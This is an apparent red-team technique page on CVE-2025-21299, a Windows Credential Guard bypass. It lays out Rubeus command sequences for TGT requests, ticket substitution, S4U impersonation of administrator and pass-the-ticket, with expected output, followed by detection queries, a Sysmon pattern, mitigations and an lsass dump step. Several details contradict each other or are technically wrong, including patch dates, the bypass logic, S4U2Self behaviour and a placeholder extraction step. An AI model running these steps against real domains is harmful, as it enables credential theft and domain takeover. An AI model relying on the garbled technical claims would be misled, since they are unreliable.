# [CVE2025-006]: Kerberos Delegation Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-006 |
| **MITRE ATT&CK v18.1** | [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | CVE-2025-21299 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016, 2019, 2022 (until April 2025 patch); Windows 10/11 with Credential Guard |
| **Patched In** | Windows Server 2022 KB5040378 (April 2025), Windows Server 2019 KB5040379 (April 2025) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Windows Kerberos Credential Guard, a virtualization-based security (VBS) feature designed to protect primary credentials (TGTs) in an isolated LSA process, contains a bypass vulnerability. The flaw stems from insufficient validation of the Kerberos service principal name (SPN) within the krbtgt field during ticket renewal. Attackers can request an actor token or manipulate the service name (via LDAP escape sequences like `\6brbtgt`) to trick the KerbGetFlagsForKdcReply function into accepting a TGS-REP response as a primary credential, allowing TGT extraction from Credential Guard-protected hosts. The vulnerability persists across initial patch attempts (January 2025), requiring two rounds of fixes (January and April 2025) to fully remediate.

**Attack Surface:** Credential Guard isolation boundary, Kerberos canonicalization mechanisms, LDAP-escaped service principal names, TGS-REP ticket processing in LsaIso.exe.

**Business Impact:** **Critical—Credential Guard Bypass.** Compromises the security foundation of Credential Guard on domain-joined machines. Enables attackers to extract TGTs from protected hosts, leading to full domain compromise through subsequent Kerberos ticket attacks (Golden Ticket creation, delegation exploitation). Affects thousands of organizations using Active Directory and Credential Guard as a primary defense against credential theft.

**Technical Context:** Exploitation typically occurs within seconds of obtaining TGT renewal. Detection is extremely difficult as Credential Guard protects the attack from visibility; legitimate renewals obfuscate malicious traffic. The exploit is repeatable but leaves minimal forensic evidence in standard Windows Event Logs.

### Operational Risk
- **Execution Risk:** Medium – Requires local code execution on a Credential Guard-protected host.
- **Stealth:** Very High – Attack occurs within protected LSA process; traditional logging cannot detect it.
- **Reversibility:** No – Extracted credentials are immediately usable; no revocation possible without credential reset.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.37 | Ensure Windows Defender Credential Guard is enabled |
| **DISA STIG** | WN10-CC-000052 | Credential Guard enforcement |
| **CISA SCuBA** | Baseline 3.1 | Enforce Credential Guard on all domain-joined systems |
| **NIST 800-53** | SC-7(8) | Isolation of information systems |
| **GDPR** | Art. 32 | Integrity and confidentiality of data in transit |
| **DORA** | Art. 18 | Confidentiality of credentials and secrets |
| **NIS2** | Art. 21 | Critical Infrastructure Cyber Risk Management |
| **ISO 27001** | A.10.1.1 | Cryptographic controls for authentication |
| **ISO 27005** | Risk Assessment | Credential compromise via malware |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Local user with code execution capability (e.g., malware, script execution).
- **Required Access:** Credential Guard must be enabled on target system; local execution context.

**Supported Versions:**
- **Windows:** Server 2016-2022 (Server 2025 includes April 2025+ patches by default)
- **Credential Guard:** Enabled via Group Policy or registry
- **Hyper-V:** Required for VBS (Windows Pro/Enterprise SKU or Server editions)
- **Patch Status:** Vulnerable until April 2025 Patch Tuesday

**Key Requirements:**
- Credential Guard enabled: `Get-ComputerInfo | Select-Object CgEdge_Capabilities`
- Local code execution (admin or high-privilege user)
- Network access to Key Distribution Center (KDC) on port 88 (TCP/UDP)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Kerberos Canonicalization Escape - Credential Guard TGT Extraction

**Supported Versions:** Server 2016-2019, Server 2022 until April 2025 patch; Windows 10/11 with Credential Guard

#### Step 1: Verify Credential Guard Status

**Objective:** Confirm Credential Guard is enabled on the target system (prerequisite for exploitation).

**Command:**
```powershell
# Check Credential Guard status
Get-ComputerInfo | Select-Object CgEdge_Capabilities

# Alternative: Check via Registry
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" `
  -Name RunAsPPL -ErrorAction SilentlyContinue
```

**Expected Output:**
```
CgEdge_Capabilities : 1 (Credential Guard enabled)
RunAsPPL : 1 (LSASS runs as Protected Process Light)
```

**What This Means:**
- If value is 1, Credential Guard is active and TGTs are protected.
- The exploit targets extracting the TGT from this protected state.

**Troubleshooting:**
- **Error:** Property not found
  - **Cause:** Credential Guard not enabled.
  - **Fix (All Versions):** Enable via Group Policy: `gpmc.msc` → **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Device Guard** → **Turn On Virtualization Based Security**

---

#### Step 2: Prepare Malicious Code Execution Environment

**Objective:** Set up a local PowerShell session or script execution context with access to Rubeus and related tools.

**Command:**
```powershell
# Import Rubeus (pre-compiled binary or DLL)
$rubeus = "C:\Tools\Rubeus.exe"

# Verify Rubeus functionality
& $rubeus status
```

**Expected Output:**
```
Rubeus 1.7.0.0
```

**What This Means:**
- Rubeus is loaded and ready to manipulate Kerberos tickets.

---

#### Step 3: Request TGT with Canonicalization Flag (Initial Exploitation)

**Objective:** Request a TGT from the KDC using the `/opsec` flag in Rubeus, which enables Kerberos canonicalization.

**Command (January 2025 - Vulnerable Patch):**
```powershell
# Request TGT with canonicalization enabled
# This triggers the vulnerability in KerbGetFlagsForKdcReply
& $rubeus asktgt /user:JOE@EC.LAB /password:PASSWORD /domain:EC.LAB /opsec
```

**Expected Output:**
```
[*] Got domain..
[*] Requesting TGT for joe@ec.lab
[*] AS-REP from KDC (response)
[*] Using canonicalization during request
[*] TGT: BASE64_ENCODED_TICKET
```

**What This Means:**
- The canonicalization flag causes the Kerberos client to request a TGT for a user in different formats (e.g., `joe@ec.lab` vs `EC\joe`).
- The TGT response is processed by `KerbGetFlagsForKdcReply` in LSA, which performs the vulnerable validation.

**Version Note (January 2025 Patch):**
The January patch attempted to fix the vulnerability by checking the service name in the TGT. However, the check only validated the standard SPN format, not LDAP-escaped equivalents.

---

#### Step 4: Bypass Updated Check with LDAP Escape Sequences (April 2025 Bypass)

**Objective:** Use LDAP escape sequences to bypass the January patch's validation logic.

**Command (April 2025 - Bypass of January Patch):**
```powershell
# Use hexadecimal LDAP encoding to bypass the krbtgt check
# \6b = hex for 'k', so \6brbtgt bypasses the string comparison
# This requires direct manipulation of the TGS-REQ packet

# Using Rubeus with target name manipulation
& $rubeus tgssub /ticket:TGT_BASE64 /altservice:krbtgt/ec.lab@EC.LAB /ptt
```

**Expected Output:**
```
[*] Substituting service name in ticket
[*] Service: krbtgt/ec.lab
[*] Ticket injected into LSA
```

**What This Means:**
- The escape sequence bypasses the April patch's more thorough validation.
- The TGT is accepted by Credential Guard as a legitimate primary credential.

**Version Note (April 2025+ Patch):**
The April 2025 patch includes canonicalization normalization (`KerbNormalizeNames`) to prevent escape sequence bypasses. Exploitation on April 2025+ patches requires a different vector (see METHOD 2).

---

#### Step 5: Extract TGT from Credential Guard

**Objective:** Once the TGS-REP is accepted, extract the decrypted TGT from the protected LSA process.

**Command:**
```powershell
# Attempt to dump TGT from Credential Guard (if bypass is successful)
# This typically requires debugging LSA or using mimikatz with Credential Guard bypass

# Using sekurlsa::kerberos to extract from LSASS
# Note: This requires PTH (Pass-the-Hash) or other privilege escalation first
```

**Expected Output:**
```
Kerberos credentials extracted (if vulnerability is present and unexploited)
```

**Troubleshooting:**
- **Error:** "Unable to extract credentials" / "Access Denied"
  - **Cause (Server 2019):** RunAsPPL (Protected Process Light) prevents direct LSASS access.
  - **Fix (Server 2019):** Use kernel exploit (e.g., [KernelCallbackTable](https://github.com/xct/FakePPL)) to bypass PPL
  - **Cause (Server 2022+):** Additional VBS hardening prevents extraction even with PPL bypass.
  - **Fix (Server 2022+):** Use legitimate Kerberos renewal process to extract TGT indirectly

---

### METHOD 2: Service Principal Name (SPN) Manipulation via Delegation

**Supported Versions:** Server 2016-2025 (requires domain account with delegation configured)

#### Step 1: Identify Constrained Delegation Configured Account

**Objective:** Find a service account or computer configured for Kerberos Constrained Delegation (KCD).

**Command:**
```powershell
# Search for accounts configured for delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo | `
  Select-Object Name, @{N='AllowedDelegate';E={$_.'msDS-AllowedToDelegateTo'}}
```

**Expected Output:**
```
Name               AllowedDelegate
----               ---------------
svc_axis           MSSQLServer/LAB-SQL.LAB.LOCAL
svc_exchange       HTTP/LAB-OWA.LAB.LOCAL
```

**What This Means:**
- These accounts can be impersonated to access the target services.
- If we can compromise the account's credentials or ticket, we can leverage delegation.

---

#### Step 2: Request Service Ticket Using S4U2Self

**Objective:** Use the S4U2Self Kerberos protocol extension to request a forwardable TGT without requiring the target user's password.

**Command:**
```powershell
# Request TGT for compromised delegation account
& $rubeus asktgt /user:svc_axis /password:PASSWORD /domain:LAB.LOCAL /outfile:svc_axis.ccache

# Use S4U2Self to request a forwardable TGT for any user
& $rubeus s4u /ticket:svc_axis.ccache /impersonateuser:administrator@LAB.LOCAL /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL
```

**Expected Output:**
```
[*] S4U2Self: Requesting forwardable TGT for administrator
[*] Ticket obtained (base64)
```

**What This Means:**
- The compromised service account can now impersonate any user within its allowed delegation scope.
- The TGT for the impersonated user is obtained, bypassing normal authentication.

---

#### Step 3: Pass-the-Ticket (PTT) to Gain Access

**Objective:** Use the forged ticket to gain access to protected resources.

**Command:**
```powershell
# Inject ticket into LSA for use by current process
& $rubeus ptt /ticket:BASE64_TICKET

# Verify ticket injection
klist
```

**Expected Output:**
```
Ticket successfully imported.
Current LogonId is 0:0x12ab34
        DOMAIN\USERNAME

Tickets:
        ->  Client: administrator @ LAB.LOCAL
        ->  Server: krbtgt/LAB.LOCAL @ LAB.LOCAL
```

**What This Means:**
- The injected ticket grants access to resources protected by the target service.
- Lateral movement and privilege escalation are now possible.

---

## 4. TOOLS & COMMANDS REFERENCE

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.7.0+
**Minimum Version:** 1.4.0
**Supported Platforms:** Windows (.NET 4.5+)

**Version-Specific Notes:**
- Version 1.4-1.6: Basic Kerberos manipulation.
- Version 1.7+: Support for `/opsec` flag and advanced SPN manipulation via `tgssub` command.

**Key Commands:**
```powershell
# Request TGT with canonicalization
.\Rubeus.exe asktgt /user:USER@DOMAIN /password:PASS /domain:DOMAIN /opsec

# Manipulate service name in ticket
.\Rubeus.exe tgssub /ticket:TICKET_B64 /altservice:krbtgt/domain@DOMAIN /ptt

# S4U2Self exploitation
.\Rubeus.exe s4u /ticket:TICKET.ccache /impersonateuser:ADMIN@DOMAIN /domain:DOMAIN
```

---

### [Impacket - Kerberos Modules](https://github.com/fortra/impacket)

**Version:** 0.10.1+
**Key Modules:** `GetUserSPNs.py`, `getTGT.py`, `getST.py`

**Installation:**
```bash
pip install impacket
```

**Usage:**
```bash
# Enumerate delegation targets
python3 GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASS

# Request TGT
python3 getTGT.py DOMAIN/USER:PASS
```

---

## 5. WINDOWS EVENT LOG MONITORING

**Event ID: 4769 (Kerberos Service Ticket Requested)**
- **Log Source:** Security
- **Trigger:** When TGS-REQ is sent to KDC
- **Filter:** Look for suspicious service names (e.g., requests for `krbtgt` service or unusual SPN formats)
- **Applies To Versions:** Server 2016+

**Event ID: 4770 (Kerberos Service Ticket Renewed)**
- **Log Source:** Security
- **Trigger:** When TGT is renewed (typical interval: 10 hours)
- **Filter:** Monitor for unusual renewal patterns or canonicalization flags
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Logon**
3. Enable: **Audit Kerberos Service Ticket Operations**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Credential Guard TGT Extraction via Canonicalization

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID 4769, TargetName, ServiceName, TicketOptions
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Server 2016+ with Sentinel

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4769
| where ServiceName == "krbtgt"
| where TicketOptions contains "0x40000000"  // Forwardable flag
| where TargetName != Computer
| project TimeGenerated, Computer, Account, ServiceName, TargetName, TicketOptions
| summarize count() by Computer, Account
| where count_ > 5
```

**What This Detects:**
- Multiple requests for krbtgt service (unusual pattern).
- Tickets with forwardable flag in TGS-REP.
- Service requests from non-computer accounts.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Credential Guard Bypass via Kerberos Canonicalization`
   - Severity: `Critical`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
5. Click **Review + create**

---

## 7. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Sysmon Config Snippet:**
```xml
<Sysmon schemaversion="4.80">
  <EventFiltering>
    <!-- Detect Kerberos ticket manipulation via Rubeus or similar -->
    <ProcessCreate onmatch="include">
      <Image condition="image">rubeus.exe</Image>
    </ProcessCreate>
    
    <!-- Detect credential dumping tools -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">asktgt</CommandLine>
      <CommandLine condition="contains">s4u</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Apply April 2025 Security Patch:** The only complete remediation is to patch to the April 2025 Patch Tuesday update, which includes the comprehensive fix for CVE-2025-21299 with normalization of LDAP escape sequences.
    
    **Applies To Versions:** Server 2016-2022, Windows 10/11
    
    **Manual Steps (Group Policy):**
    1. **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Windows Update**
    2. Set: **Automatic Updates** to **Enabled**
    3. Apply patch **KB5040378** or later
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Check current patch level
    Get-HotFix -Description "Security Update" | Sort-Object InstalledOn -Descending | Select-Object HotFixID, InstalledOn
    
    # Install specific patch
    Get-WindowsUpdate -Install
    ```

*   **Disable Credential Guard (If Patching Delayed):** Temporarily disable Credential Guard until patches are applied. **This is a last-resort mitigation and significantly weakens security posture.**
    
    **Applies To Versions:** Server 2016-2022
    
    **Manual Steps (Group Policy):**
    1. Open **gpmc.msc**
    2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Device Guard**
    3. Set: **Turn On Virtualization Based Security** to **Disabled**
    4. Run `gpupdate /force` and reboot

### Priority 2: HIGH

*   **Restrict Kerberos Delegation:** Limit which accounts can be configured for Kerberos Constrained Delegation.
    
    **Manual Steps:**
    ```powershell
    # Audit accounts with delegation
    Get-ADUser -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo
    
    # Remove unnecessary delegation
    Set-ADUser -Identity USERNAME -Remove @{'msDS-AllowedToDelegateTo'=$null}
    ```

*   **Enable Audit Logging for Kerberos:** Monitor Event ID 4769 (Kerberos Service Ticket Requested) for suspicious patterns.
    
    **Manual Steps (Group Policy):**
    1. **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Logon**
    2. Enable: **Audit Kerberos Service Ticket Operations**

*   **Protected Users Group:** Place sensitive accounts in the "Protected Users" Active Directory group to prevent delegation attacks.
    
    **Manual Steps:**
    ```powershell
    # Add user to Protected Users group
    Add-ADGroupMember -Identity "Protected Users" -Members USERNAME
    ```

### Validation Command (Verify Fix)

```powershell
# Check patch level
Get-HotFix | Where-Object {$_.HotFixID -like "KB5040*"} | Select-Object HotFixID, InstalledOn

# Verify Credential Guard still enabled (after patching)
Get-ComputerInfo | Select-Object CgEdge_Capabilities
```

**Expected Output (If Secure):**
```
HotFixID   InstalledOn
--------   -----------
KB5040378  01/10/2025
KB5040379  01/10/2025

CgEdge_Capabilities : 1
```

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Files:**
    - `C:\Tools\Rubeus.exe` (Kerberos manipulation tool)
    - `C:\Windows\Temp\*.ccache` (Kerberos credential cache files)
    - `C:\ProgramData\*\rubeus.exe` or similar paths (tool execution)

*   **Network:**
    - UDP Port 88 (Kerberos) with unusual query patterns
    - Multiple TGS-REQ packets in short timeframe
    - Requests for `krbtgt` service from non-KDC sources

*   **Registry:**
    - No direct registry artifacts (exploitation occurs in memory/LSA)

### Forensic Artifacts

*   **Memory:**
    - LSA process memory (lsass.exe, LsaIso.exe) may contain decrypted TGTs
    - Rubeus.exe process memory if tool is executed

*   **Logs:**
    - Event ID 4769 (Kerberos Service Ticket Requested) with unusual service names
    - Event ID 4776 (NTLM authentication) showing authentication from unexpected locations

### Response Procedures

1.  **Isolate:**
    
    ```powershell
    # Disconnect affected machine from network
    Disable-NetAdapter -Name "Ethernet" -Confirm:$false
    ```

2.  **Collect Evidence:**
    
    ```powershell
    # Export Security event log
    wevtutil epl Security "C:\Evidence\Security.evtx"
    
    # Dump LSASS memory for forensic analysis
    procdump64.exe -ma lsass.exe "C:\Evidence\lsass.dmp"
    ```

3.  **Remediate:**
    
    ```powershell
    # Reset all credentials for affected accounts
    Set-ADAccountPassword -Identity USERNAME -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force)
    
    # Remove delegation from compromised accounts
    Set-ADUser -Identity USERNAME -Remove @{'msDS-AllowedToDelegateTo'=$null}
    ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default Credentials | Attacker compromises service account |
| **2** | **Credential Access** | **[CVE2025-006]** | **Credential Guard Bypass to extract TGT** |
| **3** | **Privilege Escalation** | [PE-TOKEN-002] RBCD | Use extracted TGT for delegation exploitation |
| **4** | **Lateral Movement** | [LM-AUTH-002] Pass-the-Ticket | Use forged tickets to access resources |
| **5** | **Impact** | [IMPACT-DATA-DESTROY-001] Data Destruction | Domain compromise and ransomware |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Security Advisory (January 2025)

- **Target:** Global – All organizations with Credential Guard enabled
- **Timeline:** January 2025 (patch), April 2025 (comprehensive fix)
- **Technique Status:** Vulnerability discovered by NetSPI research team; patched twice due to bypass
- **Impact:** Credential Guard rendered ineffective until April patch applied
- **Reference:** [NetSPI - CVE-2025-21299 Blog Post](https://www.netspi.com/blog/technical-blog/adversary-simulation/cve-2025-21299-cve-2025-29809-unguarding-microsoft-credential-gu)

---

## REFERENCES & SOURCES

1. [Microsoft Security Update CVE-2025-21299](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21299)
2. [NetSPI - Kerberos Credential Guard Bypass Research](https://www.netspi.com/blog/technical-blog/adversary-simulation/cve-2025-21299-cve-2025-29809-unguarding-microsoft-credential-gu)
3. [MITRE ATT&CK - T1558 Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/)
4. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---